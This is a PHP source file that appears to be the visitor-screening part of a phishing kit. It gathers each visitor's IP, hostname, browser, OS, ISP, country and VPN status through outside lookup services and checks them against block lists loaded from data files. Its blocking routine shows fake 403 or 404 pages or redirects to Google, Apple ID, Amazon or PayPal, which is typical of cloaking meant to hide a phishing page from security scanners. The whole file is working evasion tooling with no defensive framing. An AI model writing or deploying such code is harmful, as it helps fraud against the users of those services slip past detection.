<?php
function get_data($data) {
    $data = file_get_contents("db/$data.dat");
    $data = explode("\n", $data);
    return $data;
}
function blocked($type) {
    if($type == "403") {
      header('HTTP/1.0 403 Forbidden', true, 403);
      die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    }
    if($type == "404") {
      header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
      die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
    }
    if($type == "Google") {
      header("location: https://google.com");
    }
    if($type == "Yahoo") {
      header("location: https://yahoo.com");
    }
    if($type == "Bing") {
      header("location: https://bing.com");
    }
    if($type == "Apple") {
      header("location: https://appleid.apple.com");
    }
    if($type == "Amazon") {
      header("location: https://amazon.com");
    }
    if($type == "Paypal") {
      header("location: https://paypal.com");
    }
    exit();
}
function check_down($url) {
  $url = parse_url($url, PHP_URL_HOST);
  if($socket = @fsockopen($url, 80, $errno, $errstr, 30)) {
      $status = "online";
      fclose($socket);
  }else{
      $status = "offline";
  }
  return $status;
}
function tulis_file($nama, $isi) {
    $click = fopen("$nama","a");
    fwrite($click,"$isi"."\n");
    fclose($click);
}
function getOS() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}

function getBrowser() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
function get_vpn($ip) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://blackbox.ipinfo.app/lookup/'.$ip);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function getisp($ip) {
    if($ip == "127.0.0.1") {
        $ip = "";
    }
    $getip = 'http://extreme-ip-lookup.com/json/' . $ip;
    $curl     = curl_init();
    curl_setopt($curl, CURLOPT_URL, $getip);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    $details   = json_decode($content);
    return $details->org;
}
function get_country($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();  
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    $resp = json_decode($resp, true);
    return $resp;
}
function getUserIP()
{
    $client  = $_SERVER['HTTP_CLIENT_IP'];
    $forward = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    }else{
        $ip = $remote;
    }
    return $ip;
}
function get_ip_backup($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    $resp = json_decode($resp, true);
    return $resp;
}
$ip = getUserIP();
$hostname = gethostbyaddr($ip);
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
$br = getBrowser();
$os = getOS();
$isp = getisp($ip);
$blocker_ua = get_data("useragent");
$blocker_ip = get_data("ip");
$blocker_hostname = get_data("hostname");
$blocker_isp = get_data("isp");
$blocker_uafull = get_data("ua-full");
$onetime = get_data("onetime");
$data = get_country($ip);
$country = $data['country'];
$ccode = $data['countryCode'];
if($country == "") {
  $cek1 = get_ip_backup($ip);
  $country = $cek1['geoplugin_countryName'];
  $ccode = $cek1['geoplugin_countryCode'];
}
if($isp == "") {
  $isp = getisp($ip);
}
$vpn = get_vpn($ip);